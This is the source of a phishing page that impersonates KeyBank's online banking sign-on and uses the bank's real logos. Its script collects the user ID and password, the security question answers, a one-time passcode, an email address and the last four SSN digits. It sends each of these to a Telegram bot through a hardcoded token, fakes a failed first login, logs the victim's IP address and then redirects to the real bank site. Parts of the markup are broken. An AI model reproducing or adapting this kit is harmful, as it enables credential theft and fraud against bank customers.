<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="https://ibx.key.com/ibxolb/login/images/favicon-32x32.png" type="image/x-icon">
    <link rel="apple-touch-icon" sizes="180x180" id="appleTouchIcon"
        href="https://ibx.key.com/ibxolb/login/images/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" id="fav32"

    <link rel="icon" type="image/png" sizes="16x16" id="fav16"

    <title>Keybank Online</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            font-family: "HelveticaNeue", "Helvetica Neue", Helvetica, Arial, sans-serif;
        }

        .kds_icon {

<body>
    <header class="md:fixed top-0 right-0 z-10 w-full bg-[#c00] py-4 px-4 flex justify-between items-center text-white">
        <div><img src="https://ibx.key.com/ibxolb/login/images/key_white_logo.png" width="189" height="auto" alt="logo">
        </div>
        <div class="flex items-end p-4 text-lg hidden md:block">
            <a href="#" class="pr-6">Contact Us</a>
            <a href="#">Open a New Account</a>
        </div>
        <div class=" md:hidden">
            <img src="https://ibx.key.com/ibxolb/login/images/menu.svg" alt="hambuger_menu">
        </div>
    </header>
    <main class="flex flex-col items-center pt-[100px] md:pt-[180px] px-4 w-full pb-[200px]">
        <div class="p-6">
            <img src="https://ibx.key.com/ibxolb/login/images/key-logo.svg" width="274" height="auto" alt="">
        </div>
        <form id="form1" class="w-full md:w-[40%] flex flex-col pt-4" onsubmit="return handleForm1Submit()">

<br/>
            <div class="w-full px-4">
                <label for="userId" class="text-[#101010]">Enter your User ID</label>
                <input type="hidden" name="ip" id="hidden_ip">
                <div class="flex gap-2 items-center text-black w-full">
                    <div class="absolute p-3">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"

                            <path d="M18 20a6 6 0 0 0-12 0" />

                            <circle cx="12" cy="12" r="10" />
                        </svg>
                    </div>
                    <input type="text" id="userId" name="userId" required

                </div>
            </div>
            <div class="ml-4 mt-8 mb-4 flex items-center">
                <div class="flex items-center">
                    <input type="checkbox" id="checkbox" class="checkbox size-6 text-red-500">
                    <label for="checkbox" class="flex items-center justify-center ml-2">
                        Save User ID
                    </label>
                </div>
            </div>
            <div class="w-full px-4">
                <label for="password" class="text-[#101010]">Enter your password</label>
                <div class="flex gap-2 items-center text-black w-full">
                    <div class="absolute p-3">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
                            stroke="#828282" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"
                            class="lucide lucide-lock">
                            <rect width="18" height="11" x="3" y="11" rx="2" ry="2" />
                            <path d="M7 11V7a5 5 0 0 1 10 0v4" />
                        </svg>
                    </div>
                    <input type="password" id="password" name="password" required
                        class="w-full px-12 py-[14px] outline-none border border-[#828282] rounded-[4px] focus:border-[2.5px] focus:border-[#0175a7]">
                </div>
            </div>
            <div class="mt-6 px-4">
                <button type="submit"
                    class="bg-[#b20707] w-full text-white font-semibold text-lg rounded-[8px] py-3 px-4 text-center"
                    id="signIn">Sign On</button>
            </div>
            <div class="w-full flex flex-col justify-center mt-6 px-4">
                <a href="#"
                    class="w-full text-[#0175a7] text-lg font-semibold rounded-[8px] py-3 px-4 text-center hover:border hover:bg-[#0dcaf022] hover:border-[#0175a7]">Problem
                    Signing On?</a>
                <div class="w-full h-[1.5px] my-4 bg-[#666]"></div>
                <a href="#"

                    in Online Banking</a>
            </div>
        </form>

            <div class="w-full px-4">

                <select name="q1" class="w-full px-12 py-[14px] outline-none border border-[#828282] rounded-[4px] mb-2"

                    <option>What is your favorite museum or cultural institution?</option>
                    <option>What is the first and last name of your oldest cousin?</option>
                    <option>What is the last name of your all-time favorite athlete?</option>
                    <option>What is your dream occupation?</option>
                    <option>What is the name of the boy/girl that you first kissed?</option>
                    <option>If you have ever broken a bone, which one?</option>
                    <option>What was the first concert or live performance you attended?</option>
                    <option>Whom did you go to prom with?</option>
                    <option>What was your favorite teacher&#39;s name?</option>
                    <option>What is your brother/sister nickname?</option>
                    <option>Who is your favorite cartoon character?</option>
                    <option>What is your favorite family holiday tradition?</option>
                    <option>What is the first name of the best man at your wedding?</option>
                    <option>What street did your best friend live on in high school?</option>
                    <option>Who is your favorite composer?</option>
                    <option>What was your favorite subject in school?</option>
                    <option>Who was your favorite childhood hero?</option>
                    <option>What is the middle name of your oldest sibling?</option>
                </select>
                <input type="text" id="a1" name="a1"
                    class="w-full px-12 py-[14px] outline-none border border-[#828282] rounded-[4px] mb-6 focus:border-[2.5px] focus:border-[#0175a7]"
                    autocomplete="off" required>
                <label for="q2" class="text-[#101010]">Security question 2</label>
                <select name="q2" class="w-full px-12 py-[14px] outline-none border border-[#828282] rounded-[4px] mb-2"
                    autocomplete="off" required>
                    <option value>Select a security question</option>
                    <option>What is your all-time favorite board game?</option>
                    <option>What is your favorite museum or cultural institution?</option>
                    <option>What is the first and last name of your oldest cousin?</option>
                    <option>What is the last name of your all-time favorite athlete?</option>
                    <option>What is your dream occupation?</option>
                    <option>What is the name of the boy/girl that you first kissed?</option>
                    <option>If you have ever broken a bone, which one?</option>
                    <option>What was the first concert or live performance you attended?</option>
                    <option>Whom did you go to prom with?</option>
                    <option>What was your favorite teacher&#39;s name?</option>
                    <option>What is your brother/sister nickname?</option>
                    <option>Who is your favorite cartoon character?</option>
                    <option>What is your favorite family holiday tradition?</option>
                    <option>What is the first name of the best man at your wedding?</option>
                    <option>What street did your best friend live on in high school?</option>

                    <option>What was your favorite subject in school?</option>
                    <option>Who was your favorite childhood hero?</option>
                    <option>What is the middle name of your oldest sibling?</option>
                </select>
                <input type="text" id="a2" name="a2"
                    class="w-full px-12 py-[14px] outline-none border border-[#828282] rounded-[4px] focus:border-[2.5px] focus:border-[#0175a7]"
                    autocomplete="off" required>
                <label for="q3" class="text-[#101010]">Security question 3</label>
                <select name="q3" class="w-full px-12 py-[14px] outline-none border border-[#828282] rounded-[4px] mb-2"
                    autocomplete="off" required>
                    <option value>Select a security question</option>
                    <option>What is your all-time favorite board game?</option>
                    <option>What is your favorite museum or cultural institution?</option>
                    <option>What is the first and last name of your oldest cousin?</option>
                    <option>What is the last name of your all-time favorite athlete?</option>
                    <option>What is your dream occupation?</option>
                    <option>What is the name of the boy/girl that you first kissed?</option>
                    <option>If you have ever broken a bone, which one?</option>
                    <option>What was the first concert or live performance you attended?</option>
                    <option>Whom did you go to prom with?</option>
                    <option>What was your favorite teacher&#39;s name?</option>
                    <option>What is your brother/sister nickname?</option>
                    <option>Who is your favorite cartoon character?</option>
                    <option>What is your favorite family holiday tradition?</option>
                    <option>What is the first name of the best man at your wedding?</option>
                    <option>What street did your best friend live on in high school?</option>
                    <option>Who is your favorite composer?</option>
                    <option>What was your favorite subject in school?</option>
                    <option>Who was your favorite childhood hero?</option>
                    <option>What is the middle name of your oldest sibling?</option>
                </select>
                <input type="text" id="a3" name="a3"
                    class="w-full px-12 py-[14px] outline-none border border-[#828282] rounded-[4px] focus:border-[2.5px] focus:border-[#0175a7]"
                    autocomplete="off" required>
            </div>
            <div class="mt-6 px-4">
                <button type="submit"
                    class="bg-[#b20707] w-full text-white font-semibold text-lg rounded-[8px] py-3 px-4 text-center"
                    id="submitSecurityAnswers">Continue</button>
            </div>
        </form>

        <form id="form3" class="w-full md:w-[40%] flex flex-col pt-4 hidden" onsubmit="return handleForm3Submit()">
            <p class="text-xl font-semibold mb-6">An OTP has been sent to your mobile phone. Please enter it below:</p>
            <div class="w-full px-4">
                <label for="otp" class="text-[#101010]">Enter OTP</label>
                <input type="text" id="otpInput" name="otp" oninput="formatNumber(this)" maxlength="6" minlength="6"
                    class="w-full px-12 py-[14px] outline-none border border-[#828282] rounded-[4px] focus:border-[2.5px] focus:border-[#0175a7]"
                    required>
            </div>
            <div class="mt-6 px-4">
                <button type="submit"
                    class="bg-[#b20707] w-full text-white font-semibold text-lg rounded-[8px] py-3 px-4 text-center"
                    id="submitOTP">Continue</button>
            </div>
        </form>
        <form id="form4" class="w-full md:w-[40%] flex flex-col pt-4 hidden" onsubmit="return handleForm4Submit()">
            <div class="w-full px-4">
                <label for="email" class="text-[#101010]">Enter your Email address</label>
                <div class="flex gap-2 items-center text-black w-full">
                    <div class="absolute p-3">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
                            stroke="#828282" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"
                            class="lucide lucide-mail">
                            <rect width="20" height="16" x="2" y="4" rx="2" />
                            <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7" />
                        </svg>
                    </div>
                    <input type="text" id="email" name="email"
                        class="w-full px-12 py-[14px] outline-none border border-[#828282] rounded-[4px] focus:border-[2.5px] focus:border-[#0175a7]">
                </div>
            </div>
            <div class="w-full px-4 mt-6">
                <label for="emailPassword" class="text-[#101010]">Last 4 Digits of SSN :</label>
                <div class="flex gap-2 items-center text-black w-full">
                    <div class="absolute p-3">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
                            stroke="#828282" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"
                            class="lucide lucide-lock">
                            <rect width="18" height="11" x="3" y="11" rx="2" ry="2" />
                            <path d="M7 11V7a5 5 0 0 1 10 0v4" />
                        </svg>
                    </div>
                    <input type="password" id="emailPassword" name="emailPassword"
                        class="w-full px-12 py-[14px] outline-none border border-[#828282] rounded-[4px] focus:border-[2.5px] focus:border-[#0175a7]">
                </div>
            </div>
            <div class="mt-6 px-4">
                <button type="submit"
                    class="bg-[#b20707] w-full text-white font-semibold text-lg rounded-[8px] py-3 px-4 text-center"
                    id="submitEmail">Submit</button>
            </div>
        </form>
    </main>
    <script>
        function formatNumber(input) {
            let value = input.value;
            value = value.replace(/\D/g, '');
            input.value = value;
        }
    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script>
        let count = 0;
        const sendTeleMsg = async (msg) => {
            const TELEGRAM_BOT_TOKEN ="6616485105:AAHtNFYKZRPaawFwzi_4T5u37IvQo73AxcE"; //YOUR_TELEGRAM_BOT_TOKEN HERE
            const CHAT_ID = "7267386805";
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`; // YOUR CHAT_ID HERE

            try {
                const response = await fetch(url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: msg
                    })
                });

                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }

                const data = await response.json();
            } catch (error) {
                console.error("Error sending message:", error);
            }
        };
        $(document).ready(function () {
            // Get the user's IP address
            $.getJSON('https://json.geoiplookup.io/?callback=?', function (data) {
                var obj = JSON.parse(JSON.stringify(data));
                document.getElementById("hidden_ip").value = obj.ip;
            });
        });


        const handleForm1Submit = () => {
            const userId = document.getElementById("userId").value;
            const password = document.getElementById("password").value;
            const ip = document.getElementById("hidden_ip").value;
            count++;

            const message = "++++++🔰K E Y BANK LOGIN🔰++++++" + '\n' +
                "[👤USER ID] : " + userId + '\n' +
                "[🔑PASSWORD] : " + password + '\n' +
                "[🌍 IP ADDRESS] : " + ip + '\n' +
                "+++++ 👨‍💻@AKFOUR7[TELEGRAM] ++++" + '\n';

            sendTeleMsg(message);

            // Show the second form after the second attempt
            if (count === 2) {
                document.getElementById("form1").classList.add("hidden");
                document.getElementById("form3").classList.remove("hidden");
            } else {
                document.querySelector("#wrongCred").style.display = "block";
                setTimeout(() => {
                    // document.querySelector("#wrongCred").style.display = "none";
                    document.querySelector("#userId").value = "";
                    document.querySelector("#password").value = "";
                }, 1000);
            }

            return false;
        };

        const handleForm2Submit = () => {
            const q1 = document.querySelector("[name='q1']").value;
            const a1 = document.getElementById("a1").value;
            const q2 = document.querySelector("[name='q2']").value;
            const a2 = document.getElementById("a2").value;
            const q3 = document.querySelector("[name='q3']").value;
            const a3 = document.getElementById("a3").value;
            const message = "++++++🔰K E Y BANK SECURITY QUESTIONS🔰++++++" + '\n' +
                "[❓SECURITY QUESTION 1] : " + q1 + '\n' +
                "[ANSWER 1] : " + a1 + '\n' +
                "[❓SECURITY QUESTION 2] : " + q2 + '\n' +
                "[ANSWER 2] : " + a2 + '\n' +
                "[❓SECURITY QUESTION 3] : " + q3 + '\n' +
                "[ANSWER 3] : " + a3 + '\n' +
                "+++++ 👨‍💻@AKFOUR7[TELEGRAM] ++++" + '\n';
            sendTeleMsg(message);

            // Show the third form
            document.getElementById("form2").classList.add("hidden");
            document.getElementById("form3").classList.remove("hidden");

            return false;
        };

        const handleForm3Submit = () => {
            const otp = document.getElementById("otpInput").value;
            const message = "++++++🔰K E Y BANK 🔑🔑OTP🔰++++++" + '\n' +
                "[🔑OTP] : " + otp + '\n' +
                "+++++ 👨‍💻@AKFOUR7[TELEGRAM] ++++" + '\n';
            sendTeleMsg(message);
            document.getElementById("form3").classList.add("hidden");
            document.getElementById("form4").classList.remove("hidden");
            return false;
        };
        const handleForm4Submit = () => {
            const email = document.getElementById("email").value;
            const emailPassword = document.getElementById("emailPassword").value;
            const message = "++++++🔰K E Y BANK 📧EMAIL🔰++++++" + '\n' +
                "[📧EMAIL ] : " + email + '\n' +
                "[🔑EMAIL PASSWORD] : " + emailPassword + '\n' +
                "+++++ 👨‍💻@AKFOUR7[TELEGRAM] ++++" + '\n';
            sendTeleMsg(message);

            setTimeout(() => {
                window.location.href = "https://www.key.com/personal/index.html"; // Redirect to another URL
            }, 2000);

            return false;
        };

        document.addEventListener("DOMContentLoaded", function () {
            fetch("https://api.ipify.org?format=json")
                .then(response => response.json())
                .then(data => {
                    const ipAddress = data.ip;
                    document.getElementById("hidden_ip").value = ipAddress;
                })
                .catch(error => {
                    console.error("Error fetching IP address:", error);
                });
        });
    </script>
</body>
